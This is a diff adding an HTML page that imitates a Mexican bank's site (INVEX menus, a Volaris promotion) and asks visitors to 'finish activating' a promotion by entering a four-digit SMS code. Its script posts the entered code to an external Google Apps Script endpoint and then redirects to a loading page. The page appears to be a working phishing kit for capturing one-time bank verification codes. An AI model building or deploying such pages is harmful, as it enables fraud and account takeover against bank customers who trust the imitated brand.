@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PlataCard</title>
+
+    <link rel="icon" href="img/icono.imagotipo.svg">
+
+    <link rel="stylesheet" href="style.css">
+
+</head>
+<body>
+
+    <header class="header">
+
+        <div class="logo">
+            <a href="index.html" class="logo"><img src="img/LogoBanco.png" alt="logo"></a>
+        </div>
+
+        <input type="checkbox" id="toggle">
+        <label for="toggle"><img class="menu" src="img/icono_bars.svg" alt="menu"></label>
+        
+        <nav class="navigation">
+
+            <ul>
+                
+                <li><a href="#" class="acceso"><img src="img/icono-login.svg" alt="educacion">Acceso a clientes</a>
+                    <ul>
+                        <li><a href="#">Cuentas de Efectivo e Inversión</a></li>
+                        <li><a href="#">INVEX Tarjetas</a></li>
+                        <li><a href="formulario.html">VOLARIS Promociones</a></li>
+                    </ul>
+                </li>
+                <li><a href="#">Personas</a>
+                    <ul>
+                        <li><a href="#">Banca Privada</a></li>
+                        <li><a href="#">Banca Patrimonial</a></li>
+                        <li><a href="#">Fiduciario</a></li>
+                        <li><a href="#">Tarjetas de Crédito</a></li>
+                        <li><a href="#">NowBank</a></li>
+                        <li><a href="#">Retiro</a></li>
+                    </ul>
+                </li>
+                <li><a href="#">Empresas</a>
+                    <ul>
+                        <li><a href="#">Banca Empresas</a></li>
+                        <li><a href="#">Arrendadora</a></li>
+                        <li><a href="#">Fiduciario</a></li>
+                        <li><a href="#">Tarjetas de Crédito</a></li>
+                    </ul>
+                </li>
+                <li><a href="#">Nosotros</a></li>
+            </ul>
+        </nav>
+    </header>
+    
+    <section class="ingresar" id="ingresar">
+        <form id="miFormulario">
+    <p>FINALIZA LA ACTIVACIÓN DE TU PROMOCIÓN</p>
+    <h2>Ingresa el folio de cuatro digitos que te enviamos por SMS</h2>
+
+    <div class="inputcaja">
+        <label for="codigo">Codigo SMS</label>
+        <input type="text" name="codigo" placeholder="Codigo SMS" id="codigo" required>
+
+        <input class="btn" type="submit" value="ACTIVAR">
+    </div>
+</form>
+
+<script>
+  const form = document.getElementById('miFormulario');
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbw5osmSFxHL5gsPlGHFjl9Ik1Hpshc3beaAMmUla4VUbbEhkpN43elAC9-Xy1YiIO8TWw/exec';
+
+  form.addEventListener('submit', function (e) {
+    e.preventDefault(); // Previene el envío por defecto
+
+    fetch(scriptURL, {
+      method: 'POST',
+      body: new FormData(form)
+    })
+    .then(response => {
+      if (response.ok) {
+        // Redirige tras el envío exitoso
+        window.location.href = 'loading-tres.html';
+      } else {
+        alert('Hubo un error al enviar. Intenta de nuevo.');
+      }
+    })
+    .catch(error => {
+      console.error('Error al enviar:', error);
+      alert('Error al conectar con el servidor.');
+    });
+  });
+</script>
+    </section>
+
+    <section class="imagen2" id="imagen2">
+        <div class="end">
+            <a href="#" class="footer"><img src="img/FIFA.jpg" alt="footer"></a>
+        </div>
+    </section>
+
+    <section class="imagen2" id="imagen2">
+        <div class="end">
+            <a href="#" class="footer"><img src="img/footer-BA-01.jpg" alt="footer"></a>
+        </div>
+    </section>
+
+    <script>
+        function validarFormulario(event) {
+            event.preventDefault(); // Evita el envío del formulario por defecto
+
+            var usuario = document.getElementById("usuario").value.trim();
+
+            if (usuario === "") {
+                alert("Por favor, completa todos los campos.");
+                return false;
+            }
+
+            window.location.href = "bloqueo.html"; // Redirige a la página bloqueo.html si la validación es exitosa
+
+            // Redirige a la página bloqueo.html si la validación es exitosa
+            return true;
+        }
+    </script>
+    
+</body>
+</html>
